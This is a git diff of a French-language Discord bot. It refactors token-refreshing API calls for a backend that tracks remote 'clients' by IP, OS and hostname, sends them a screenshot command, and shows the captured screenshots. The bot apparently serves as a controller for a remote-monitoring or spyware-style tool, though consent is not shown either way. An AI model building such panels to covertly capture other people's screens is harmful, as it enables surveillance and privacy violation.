@@ -1,15 +1,61 @@
-import { Client, GatewayIntentBits, EmbedBuilder, ButtonBuilder, ActionRowBuilder, StringSelectMenuBuilder,
-    AttachmentBuilder } from 'discord.js';
+import {
+    ActionRowBuilder,
+    AttachmentBuilder,
+    ButtonBuilder,
+    Client,
+    EmbedBuilder,
+    GatewayIntentBits,
+    StringSelectMenuBuilder
+} from 'discord.js';
 import config from './config.json' assert {type: 'json'};
 import axios from "axios";
 import {commands} from './commands.js';
 
-const { TOKEN, API_BASE_URL } = config;
+const { TOKEN, API_BASE_URL, API_TOKEN } = config;
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-client.on('ready', () => {
+let tokenData = { token: '', expires: Date.now() };
+
+async function executeRequestWithTokenRefresh(url, options = { method: 'GET', data: null }) {
+    const tryRequest = async () => {
+        if (options.data) {
+            return axios({ url, method: options.method, data: options.data, headers: { 'Authorization': `Bearer ${tokenData.token}` } });
+        } else {
+            return axios({ url, method: options.method, headers: { 'Authorization': `Bearer ${tokenData.token}` } });
+        }
+    };
+
+    try {
+        return await tryRequest();
+    } catch (error) {
+        if (error.response && error.response.status === 401) {
+            await refreshTokenIfNeeded(true);
+            return await tryRequest();
+        } else {
+            throw error;
+        }
+    }
+}
+
+async function refreshTokenIfNeeded(forceRefresh = false) {
+    if (forceRefresh || Date.now() >= tokenData.expires) {
+        try {
+            const response = await axios.post(`${API_BASE_URL}/auth`, {
+                secret_key: API_TOKEN,
+            });
+            tokenData.token = response.data.access_token;
+            tokenData.expires = Date.now() + (24 * 60 * 60 * 1000);
+            console.log("Token récupéré avec succès !")
+        } catch (error) {
+            console.error("Erreur lors de la récupération du token", error);
+        }
+    }
+}
+
+client.on('ready', async () => {
     console.log(`Connecté en tant que ${client.user.tag}!`);
     client.user.setActivity('/help');
+    await refreshTokenIfNeeded();
 });
 
 const handleHelpCommand = async (interaction) => {
@@ -28,15 +74,16 @@ const handleHelpCommand = async (interaction) => {
 const handleScreenshotCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     await interaction.deferReply({ ephemeral: true });
-    axios.post(`${API_BASE_URL}/command/${clientId}`, { command: 'screenshot' })
-        .then(response => {
-            interaction.editReply(`${response.data.message}`);
-        })
-        .catch(error => {
-            console.error("Erreur lors de l'envoi de la commande", error);
-            interaction.editReply("Erreur lors de l'envoi de la commande.");
-        });
-};
+    const url = `${API_BASE_URL}/command/${clientId}`;
+    try {
+        await executeRequestWithTokenRefresh(url, { method: 'POST', data: { command: 'screenshot' } });
+        await interaction.editReply(`${commands.find(command => command.name === 'screenshot').description}`);
+    } catch (error) {
+        console.error("Erreur lors de l'envoi de la commande", error);
+        await interaction.editReply("Erreur lors de l'envoi de la commande.");
+    }
+}
+
 
 const handleClientsCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
@@ -45,7 +92,7 @@ const handleClientsCommand = async (interaction) => {
     const url = `${API_BASE_URL}/clients${statusFilter ? `?status=${statusFilter}` : ''}`;
 
     try {
-        const response = await axios.get(url);
+        const response = await executeRequestWithTokenRefresh(url);
         const clients = response.data.clients;
 
         if (clients.length === 0) {
@@ -53,61 +100,20 @@ const handleClientsCommand = async (interaction) => {
             return;
         }
 
-        if (statusFilter) {
-            const color = statusFilter === 'online' ? '#00FF00' : '#FF0000';
-            const status = statusFilter === 'online' ? 'EN LIGNE' : 'HORS LIGNE';
-            const embed = new EmbedBuilder()
-                .setTitle(`Clients ${status}`)
-                .setDescription(clients.map(client =>
-                    `**${client.name || 'Client sans nom'} / ${client.ip}**\n
-                    **OS :** ${client.os}
-                    **Version :** ${client.version}
-                    **Hostname :** ${client.hostname}
-                    **Créé le :** ${client.date_created}
-                    **Mis à jour le :** ${client.date_updated}`
-                ).join('\n\n'))
-                .setColor(color)
-                .setTimestamp();
+        const embeds = clients.map(client => new EmbedBuilder()
+            .setTitle(`Client ${client.name || 'Client sans nom'} / ${client.ip}`)
+            .setDescription(
+                `**OS :** ${client.os}\n` +
+                `**Version :** ${client.version}\n` +
+                `**Hostname :** ${client.hostname}\n` +
+                `**Créé le :** ${client.date_created}\n` +
+                `**Mis à jour le :** ${client.date_updated}\n` +
+                `**Statut :** ${client.status.toUpperCase()}`
+            )
+            .setColor(client.status === 'online' ? '#00FF00' : '#FF0000')
+            .setTimestamp());
 
-            await interaction.editReply({ embeds: [embed] });
-        } else {
-            const onlineClients = clients.filter(client => client.status === 'online');
-            const offlineClients = clients.filter(client => client.status === 'offline');
-
-            const embeds = [];
-
-            if (onlineClients.length > 0) {
-                embeds.push(new EmbedBuilder()
-                    .setTitle('Clients EN LIGNE')
-                    .setDescription(onlineClients.map(client =>
-                        `**${client.name || 'Client sans nom'} / ${client.ip}**\n
-                        **OS :** ${client.os}
-                        **Version :** ${client.version}
-                        **Hostname :** ${client.hostname}
-                        **Créé le :** ${client.date_created}
-                        **Mis à jour le :** ${client.date_updated}`
-                    ).join('\n\n'))
-                    .setColor('#00FF00')
-                    .setTimestamp());
-            }
-
-            if (offlineClients.length > 0) {
-                embeds.push(new EmbedBuilder()
-                    .setTitle('Clients HORS LIGNE')
-                    .setDescription(offlineClients.map(client =>
-                        `**${client.name || 'Client sans nom'} / ${client.ip}**\n
-                        **OS :** ${client.os}
-                        **Version :** ${client.version}
-                        **Hostname :** ${client.hostname}
-                        **Créé le :** ${client.date_created}
-                        **Mis à jour le :** ${client.date_updated}`
-                    ).join('\n\n'))
-                    .setColor('#FF0000')
-                    .setTimestamp());
-            }
-
-            await interaction.editReply({ embeds: embeds });
-        }
+        await interaction.editReply({ embeds });
     } catch (error) {
         console.error("Erreur lors de la récupération des clients", error);
         await interaction.editReply("Erreur lors de la récupération des clients.");
@@ -122,32 +128,34 @@ const handleStopCommand = async (interaction) => {
 
 const handleListAllScreenshotsCommand = async (interaction) => {
     await interaction.deferReply({ ephemeral: true });
-    axios.get(`${API_BASE_URL}/clients`)
-        .then(response => {
-            const clients = response.data.clients;
-            if (clients.length === 0) {
-                interaction.editReply("Aucun client disponible.");
-                return;
-            }
+    try {
+        const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/clients`);
+        const clients = response.data.clients;
 
-            const buttons = clients.map(client =>
-                new ButtonBuilder()
-                    .setCustomId(`client_${client.id}`)
-                    .setLabel(`${client.name || 'Client sans nom'} / ${client.ip}`)
-                    .setStyle(1)
-            );
+        if (clients.length === 0) {
+            await interaction.editReply("Aucun client disponible.");
+            return;
+        }
 
-            // Création des lignes d'actions avec 5 boutons maximum par ligne (limite Discord)
-            const components = buttons.slice(0, 5).map(button => new ActionRowBuilder().addComponents(button));
+        const buttons = clients.map(client =>
+            new ButtonBuilder()
+                .setCustomId(`client_${client.id}`)
+                .setLabel(`${client.name || 'Client sans nom'} / ${client.ip}`)
+                .setStyle(1)
+        );
 
-            interaction.editReply({ content: "Selectionnez un client pour voir les captures d'écran :", components });
-        })
-        .catch(error => {
-            console.error("Erreur lors de la récupération des clients", error);
-            interaction.editReply("Erreur lors de la récupération des clients.");
-        });
+        const components = [];
+        for (let i = 0; i < buttons.length; i += 5) {
+            const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
+            components.push(actionRow);
+        }
+
+        await interaction.editReply({ content: "Sélectionnez un client pour voir les captures d'écran :", components });
+    } catch (error) {
+        console.error("Erreur lors de la récupération des clients", error);
+        await interaction.editReply("Erreur lors de la récupération des clients.");
+    }
 };
-
 
 client.on('interactionCreate', async interaction => {
     if (interaction.isChatInputCommand()) {
@@ -170,65 +178,65 @@ client.on('interactionCreate', async interaction => {
         }
     } else if (interaction.isButton()) {
         const clientId = interaction.customId.split('_')[1];
-        axios.get(`${API_BASE_URL}/screenshot/client/${clientId}`)
-            .then(response => {
-                const screenshots = response.data.screenshots;
-                if (screenshots.length === 0) {
-                    interaction.update("Aucune capture d'écran disponible pour ce client.");
-                    return;
-                }
+        try {
+            const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/screenshot/client/${clientId}`);
+            const screenshots = response.data.screenshots;
+            if (screenshots.length === 0) {
+                await interaction.update("Aucune capture d'écran disponible pour ce client.");
+                return;
+            }
 
-                const options = screenshots.map(screenshot => ({
-                    label: `Capture d\'écran ${screenshot.id}`,
-                    description: `Le ${screenshot.date_created}`,
-                    value: screenshot.id.toString(),
-                }));
+            const options = screenshots.map(screenshot => ({
+                label: `Capture d\'écran ${screenshot.id}`,
+                description: `Le ${screenshot.date_created}`,
+                value: screenshot.id.toString(),
+            }));
 
-                const selectMenu = new StringSelectMenuBuilder()
-                    .setCustomId("select_screenshot")
-                    .setPlaceholder("Selectionnez une capture d'écran")
-                    .addOptions(options.slice(0, 25)); // Discord limit of 25 options
+            const selectMenu = new StringSelectMenuBuilder()
+                .setCustomId("select_screenshot")
+                .setPlaceholder("Selectionnez une capture d'écran")
+                .addOptions(options.slice(0, 25)); // Discord limit of 25 options
 
-                const row = new ActionRowBuilder().addComponents(selectMenu);
+            const row = new ActionRowBuilder().addComponents(selectMenu);
 
-                interaction.update({ content: "Selectionnez une capture d'écran :", components: [row] });
-            })
-            .catch(error => {
-                console.error("Erreur lors de la récupération des captures d'écran pour ce client", error);
-                interaction.update({ content: "Erreur lors de la récupération des captures d'écran pour ce client." });
-            });
-        } else if (interaction.customId === "select_screenshot") {
-            const screenshotId = interaction.values[0];
-            axios
-                .get(`${API_BASE_URL}/screenshot/image/${screenshotId}`, {
-                    responseType: "arraybuffer",
-                })
-                .then((response) => {
-                    const imageBuffer = Buffer.from(response.data, "binary");
-                    const attachment = new AttachmentBuilder(imageBuffer, {
-                        name: "screenshot.png",
-                    });
-
-                    const embed = new EmbedBuilder()
-                        .setTitle("Capture d'écran")
-                        .setDescription("Voici la capture d'écran :")
-                        .setImage("attachment://screenshot.png");
-
-                    interaction.update({
-                        content: "Voici la capture d'écran :",
-                        files: [attachment],
-                        embeds: [embed],
-                        components: [],
-                    });
-                })
-                .catch((error) => {
-                    console.error("Erreur lors de la récupération de l'image de la capture d'écran", error);
-                    interaction.update({
-                        content: "Erreur lors de la récupération de l'image de la capture d'écran.",
-                        components: [],
-                    });
-                });
+            await interaction.update({ content: "Selectionnez une capture d'écran :", components: [row] });
+        } catch (error) {
+            console.error("Erreur lors de la récupération des captures d'écran pour ce client", error);
+            await interaction.update({ content: "Erreur lors de la récupération des captures d'écran pour ce client." });
         }
+    } else if (interaction.customId === "select_screenshot") {
+        const screenshotId = interaction.values[0];
+        axios
+            .get(`${API_BASE_URL}/screenshot/image/${screenshotId}`, {
+                responseType: "arraybuffer",
+            })
+            .then((response) => {
+                const imageBuffer = Buffer.from(response.data, "binary");
+                const attachment = new AttachmentBuilder(imageBuffer, {
+                    name: "screenshot.png",
+                });
+
+                const embed = new EmbedBuilder()
+                    .setTitle("Capture d'écran")
+                    .setDescription("Voici la capture d'écran :")
+                    .setImage("attachment://screenshot.png");
+
+                interaction.update({
+                    content: "Voici la capture d'écran :",
+                    files: [attachment],
+                    embeds: [embed],
+                    components: [],
+                });
+            })
+            .catch((error) => {
+                console.error("Erreur lors de la récupération de l'image de la capture d'écran", error);
+                interaction.update({
+                    content: "Erreur lors de la récupération de l'image de la capture d'écran.",
+                    components: [],
+                });
+            });
+    }
+
 });
 
 client.login(TOKEN);
